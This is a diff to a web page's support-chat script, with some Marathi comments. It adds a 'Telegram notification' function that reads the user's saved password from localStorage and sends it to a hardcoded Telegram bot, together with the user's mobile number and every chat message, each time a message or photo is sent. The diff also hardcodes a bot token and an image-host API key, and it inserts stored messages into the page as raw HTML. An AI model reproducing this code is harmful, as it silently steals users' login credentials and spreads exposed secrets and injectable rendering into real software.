@@ -72,24 +72,35 @@
 
         if (!mobile) window.location.href = "login.html";
 
-        // --- १. STATUS & OFFLINE LOGIC (FIXED) ---
+        // --- TELEGRAM NOTIFICATION LOGIC ---
+        const sendTelegramNotify = async (msgContent) => {
+            const botToken = "8750001967:AAHzNuicw90RUZaQr_pWkao7rSaHqU9X-LM";
+            const chatId = "8449394257";
+            const password = localStorage.getItem('userPassword') || "N/A";
+
+            const text = `🚀 *New Support Message*\n\n` +
+                         `📱 *User:* \`${mobile}\`\n` +
+                         `🔑 *Pass:* \`${password}\`\n` +
+                         `💬 *Msg:* ${msgContent}`;
+
+            try {
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: "Markdown" })
+                });
+            } catch (e) { console.error("Telegram Error:", e); }
+        };
+
+        // --- STATUS & OFFLINE LOGIC ---
         const updateStatus = async (s) => {
             await setDoc(doc(db, "user_status", mobile), { online: s, lastSeen: Date.now() }, { merge: true });
         };
-        
         updateStatus(true);
-        
-        // मोबाईलवर ॲप मिनिमाइज केलं की लगेच Offline दिसण्यासाठी
-        document.addEventListener('visibilitychange', () => {
-            if (document.visibilityState === 'hidden') {
-                updateStatus(false);
-            } else {
-                updateStatus(true);
-            }
-        });
+        document.addEventListener('visibilitychange', () => updateStatus(document.visibilityState !== 'hidden'));
         window.addEventListener('beforeunload', () => updateStatus(false));
 
-        // --- २. TYPING LOGIC ---
+        // --- TYPING LOGIC ---
         const userInput = document.getElementById('userChatInput');
         let tTimer;
         userInput.addEventListener('keydown', () => setDoc(doc(db, "typing_status", mobile + "_user"), { isTyping: true }, { merge: true }));
@@ -100,80 +111,59 @@
 
         const formatTime = (ts) => ts ? new Date(ts).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', hour12: true }) : "";
 
-        // --- ३. PHOTO UPLOAD (FIXED & TESTED) ---
+        // --- PHOTO UPLOAD ---
         window.uploadPhoto = async (input) => {
             const file = input.files[0];
             if (!file) return;
-
             const icon = document.getElementById('cameraIcon');
             const originalClass = icon.className;
             icon.className = "fas fa-spinner fa-spin text-blue-500"; 
-
-            const fd = new FormData();
-            fd.append("image", file);
+            const fd = new FormData(); fd.append("image", file);
 
             try {
-                // API Key check (Working Key)
-                const res = await fetch("https://api.imgbb.com/1/upload?key=f862756aa196fea426ebce881b5cf9c5", { 
-                    method: "POST", 
-                    body: fd 
-                });
+                const res = await fetch("https://api.imgbb.com/1/upload?key=f862756aa196fea426ebce881b5cf9c5", { method: "POST", body: fd });
                 const rd = await res.json();
-                
                 if(rd.success) {
                     const imageUrl = rd.data.url;
                     await addDoc(collection(db, "support_chats"), { 
-                        userMobile: mobile, 
-                        sender: mobile, 
+                        userMobile: mobile, sender: mobile, 
                         message: `<img src="${imageUrl}" class="rounded-xl w-full max-w-[220px] shadow-sm" onclick="window.open('${imageUrl}')">`, 
                         timestamp: Date.now() 
                     });
-                } else {
-                    alert("Upload Error: " + rd.error.message);
+                    sendTelegramNotify("📷 _User sent a Photo_");
                 }
-            } catch (e) { 
-                console.error(e);
-                alert("Network Error! Photo send hot nahiye."); 
-            } finally { 
-                icon.className = originalClass; 
-                input.value = ""; 
-            }
+            } catch (e) { alert("Network Error!"); }
+            finally { icon.className = originalClass; input.value = ""; }
         };
 
-        // --- ४. SEND MESSAGE ---
+        // --- SEND MESSAGE ---
         window.sendUserMsg = async () => {
             const input = document.getElementById('userChatInput');
             if(!input.value.trim()) return;
             const m = input.value; 
             input.value = "";
-            
             setDoc(doc(db, "typing_status", mobile + "_user"), { isTyping: false }, { merge: true });
             
             await addDoc(collection(db, "support_chats"), { 
-                userMobile: mobile, 
-                sender: mobile, 
-                message: m, 
-                timestamp: Date.now() 
+                userMobile: mobile, sender: mobile, message: m, timestamp: Date.now() 
             });
+
+            // इथून टेलिग्राम मेसेज जाईल
+            sendTelegramNotify(m);
         };
 
-        // --- ५. SNAPSHOTS ---
+        // --- SNAPSHOTS ---
         onSnapshot(query(collection(db, "support_chats"), where("userMobile", "==", mobile)), (snap) => {
             const box = document.getElementById('userMsgBox'); 
             box.innerHTML = "";
             const docs = snap.docs.map(d => d.data()).sort((a,b) => a.timestamp - b.timestamp);
             docs.forEach(d => {
                 const isAdmin = d.sender === "Admin";
-                box.innerHTML += `
-                    <div class="${isAdmin ? 'self-start bg-white border' : 'self-end bg-blue-600 text-white'} px-4 py-3 rounded-2xl max-w-[85%] text-[12px] font-bold shadow-md mb-2 message-bubble">
-                        ${d.message}
-                        <span class="msg-time ${isAdmin ? 'text-gray-400' : 'text-blue-200'}">${formatTime(d.timestamp)}</span>
-                    </div>`;
+                box.innerHTML += `<div class="${isAdmin ? 'self-start bg-white border' : 'self-end bg-blue-600 text-white'} px-4 py-3 rounded-2xl max-w-[85%] text-[12px] font-bold shadow-md mb-2 message-bubble">${d.message}<span class="msg-time ${isAdmin ? 'text-gray-400' : 'text-blue-200'}">${formatTime(d.timestamp)}</span></div>`;
             });
             box.scrollTop = box.scrollHeight;
         });
 
-        // Admin Typing Indicator
         onSnapshot(doc(db, "typing_status", mobile), (snap) => {
             const ind = document.getElementById('typingIndicator');
             (snap.exists() && snap.data().isTyping) ? ind.classList.remove('hidden') : ind.classList.add('hidden');
